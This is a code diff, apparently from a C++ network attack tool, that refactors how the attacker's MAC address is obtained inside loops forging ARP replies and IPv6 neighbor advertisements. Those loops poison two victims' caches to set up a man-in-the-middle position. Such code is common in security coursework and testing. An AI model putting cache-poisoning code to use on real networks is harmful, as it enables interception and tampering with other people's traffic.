@@ -26,13 +26,13 @@ int main(int argc, char **argv) {
             /* Perform ARP cache poison */
             while (loop) {
                 ARP_packet *arpReply1 = ARP_packet::createReply(
-                        networkInterface.getPhysicalAddress(),
+                        networkInterface.getHost()->getMacAddress(),
                         arguments.getVictim2Ipv4Address(),
                         arguments.getVictim1MacAddress(),
                         arguments.getVictim1Ipv4Address()
                 );
                 ARP_packet *arpReply2 = ARP_packet::createReply(
-                        networkInterface.getPhysicalAddress(),
+                        networkInterface.getHost()->getMacAddress(),
                         arguments.getVictim1Ipv4Address(),
                         arguments.getVictim2MacAddress(),
                         arguments.getVictim2Ipv4Address()
@@ -70,13 +70,13 @@ int main(int argc, char **argv) {
             /* Perform NDP cache poison */
             while (loop) {
                 ICMPv6_packet *neighborAdvertisement1 = ICMPv6_packet::createNeighborAdvertisement(
-                        networkInterface.getPhysicalAddress(),
+                        networkInterface.getHost()->getMacAddress(),
                         arguments.getVictim2Ipv6Address(),
                         arguments.getVictim1MacAddress(),
                         arguments.getVictim1Ipv6Address()
                 );
                 ICMPv6_packet *neighborAdvertisement2 = ICMPv6_packet::createNeighborAdvertisement(
-                        networkInterface.getPhysicalAddress(),
+                        networkInterface.getHost()->getMacAddress(),
                         arguments.getVictim1Ipv6Address(),
                         arguments.getVictim2MacAddress(),
                         arguments.getVictim2Ipv6Address()
